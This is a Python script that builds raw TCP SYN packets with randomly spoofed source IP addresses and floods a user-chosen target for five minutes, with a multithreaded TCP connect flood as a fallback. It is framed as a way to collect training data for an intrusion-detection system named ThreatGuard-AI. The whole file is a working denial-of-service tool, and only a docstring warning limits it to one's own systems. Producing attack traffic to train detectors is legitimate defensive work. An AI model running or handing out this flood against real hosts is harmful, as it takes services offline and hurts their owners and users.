"""
SYN Flood Attack Script for ThreatGuard-AI Training Data Collection
Run this on an EXTERNAL machine (not the target PC)

WARNING: Only use on YOUR OWN systems for research/testing!
"""

import socket
import random
import struct
import sys

def checksum(msg):
    """Calculate IP checksum"""
    s = 0
    for i in range(0, len(msg), 2):
        if i + 1 < len(msg):
            w = msg[i] + (msg[i+1] << 8)
        else:
            w = msg[i]
        s = s + w
    s = (s >> 16) + (s & 0xffff)
    s = s + (s >> 16)
    return ~s & 0xffff

def create_syn_packet(src_ip, dst_ip, dst_port):
    """Create a raw SYN packet"""
    # IP Header
    ip_ihl = 5
    ip_ver = 4
    ip_tos = 0
    ip_tot_len = 40
    ip_id = random.randint(1, 65535)
    ip_frag_off = 0
    ip_ttl = 64
    ip_proto = socket.IPPROTO_TCP
    ip_check = 0
    ip_saddr = socket.inet_aton(src_ip)
    ip_daddr = socket.inet_aton(dst_ip)
    
    ip_ihl_ver = (ip_ver << 4) + ip_ihl
    ip_header = struct.pack('!BBHHHBBH4s4s',
        ip_ihl_ver, ip_tos, ip_tot_len, ip_id, ip_frag_off,
        ip_ttl, ip_proto, ip_check, ip_saddr, ip_daddr)
    
    # TCP Header
    tcp_src = random.randint(1024, 65535)
    tcp_dst = dst_port
    tcp_seq = random.randint(0, 4294967295)
    tcp_ack_seq = 0
    tcp_doff = 5
    tcp_fin = 0
    tcp_syn = 1
    tcp_rst = 0
    tcp_psh = 0
    tcp_ack = 0
    tcp_urg = 0
    tcp_window = socket.htons(5840)
    tcp_check = 0
    tcp_urg_ptr = 0
    
    tcp_offset_res = (tcp_doff << 4) + 0
    tcp_flags = tcp_fin + (tcp_syn << 1) + (tcp_rst << 2) + (tcp_psh << 3) + (tcp_ack << 4) + (tcp_urg << 5)
    
    tcp_header = struct.pack('!HHLLBBHHH',
        tcp_src, tcp_dst, tcp_seq, tcp_ack_seq,
        tcp_offset_res, tcp_flags, tcp_window, tcp_check, tcp_urg_ptr)
    
    # Pseudo header for checksum
    placeholder = 0
    protocol = socket.IPPROTO_TCP
    tcp_length = len(tcp_header)
    psh = struct.pack('!4s4sBBH', ip_saddr, ip_daddr, placeholder, protocol, tcp_length)
    psh = psh + tcp_header
    tcp_check = checksum(psh)
    
    tcp_header = struct.pack('!HHLLBBH',
        tcp_src, tcp_dst, tcp_seq, tcp_ack_seq,
        tcp_offset_res, tcp_flags, tcp_window) + struct.pack('H', tcp_check) + struct.pack('!H', tcp_urg_ptr)
    
    return ip_header + tcp_header

def syn_flood(target_ip, target_port, duration_seconds=300):
    """Send SYN flood to target"""
    print(f"""
╔═══════════════════════════════════════════════════════════════╗
║           SYN FLOOD - FOR TRAINING DATA ONLY                  ║
╚═══════════════════════════════════════════════════════════════╝

Target: {target_ip}:{target_port}
Duration: {duration_seconds} seconds

Press Ctrl+C to stop early.
""")
    
    try:
        # Create raw socket
        s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_TCP)
        s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
    except PermissionError:
        print("ERROR: Run as Administrator!")
        print("Right-click Command Prompt -> Run as Administrator")
        sys.exit(1)
    except Exception as e:
        print(f"Socket error: {e}")
        print("\nTrying fallback method (TCP connect flood)...")
        tcp_connect_flood(target_ip, target_port, duration_seconds)
        return
    
    import time
    start_time = time.time()
    packet_count = 0
    
    print("Sending SYN packets...")
    
    try:
        while time.time() - start_time < duration_seconds:
            # Random spoofed source IP
            src_ip = f"{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}.{random.randint(1,254)}"
            
            packet = create_syn_packet(src_ip, target_ip, target_port)
            
            try:
                s.sendto(packet, (target_ip, 0))
                packet_count += 1
                
                if packet_count % 10000 == 0:
                    elapsed = time.time() - start_time
                    rate = packet_count / elapsed
                    print(f"  Sent: {packet_count:,} packets | Rate: {rate:.0f} pkt/s | Time: {elapsed:.0f}s")
            except:
                pass
                
    except KeyboardInterrupt:
        print("\n\nStopped by user.")
    
    elapsed = time.time() - start_time
    print(f"\n✓ Complete! Sent {packet_count:,} SYN packets in {elapsed:.1f} seconds")
    s.close()

def tcp_connect_flood(target_ip, target_port, duration_seconds):
    """Fallback: TCP connect flood (doesn't require raw sockets)"""
    import time
    import threading
    
    start_time = time.time()
    connection_count = [0]
    running = [True]
    
    def flood_thread():
        while running[0] and time.time() - start_time < duration_seconds:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.settimeout(0.1)
                s.connect((target_ip, target_port))
                connection_count[0] += 1
                s.close()
            except:
                connection_count[0] += 1  # Count attempts too
    
    print(f"Starting TCP connect flood to {target_ip}:{target_port}...")
    
    # Start multiple threads
    threads = []
    for _ in range(50):
        t = threading.Thread(target=flood_thread)
        t.daemon = True
        t.start()
        threads.append(t)
    
    try:
        while time.time() - start_time < duration_seconds:
            time.sleep(5)
            elapsed = time.time() - start_time
            rate = connection_count[0] / elapsed
            print(f"  Connections: {connection_count[0]:,} | Rate: {rate:.0f}/s | Time: {elapsed:.0f}s")
    except KeyboardInterrupt:
        print("\nStopped.")
    
    running[0] = False
    print(f"\n✓ Complete! {connection_count[0]:,} connection attempts in {time.time()-start_time:.1f}s")

if __name__ == "__main__":
    print("="*60)
    print("SYN FLOOD SCRIPT - ThreatGuard-AI Training Data")
    print("="*60)
    
    if len(sys.argv) < 2:
        target_ip = input("Enter target IP: ").strip()
    else:
        target_ip = sys.argv[1]
    
    target_port = 80
    duration = 300  # 5 minutes
    
    print(f"\nTarget: {target_ip}:{target_port}")
    print(f"Duration: {duration} seconds (5 minutes)")
    
    confirm = input("\nStart attack? (yes/no): ").strip().lower()
    if confirm == "yes":
        syn_flood(target_ip, target_port, duration)
    else:
        print("Cancelled.")
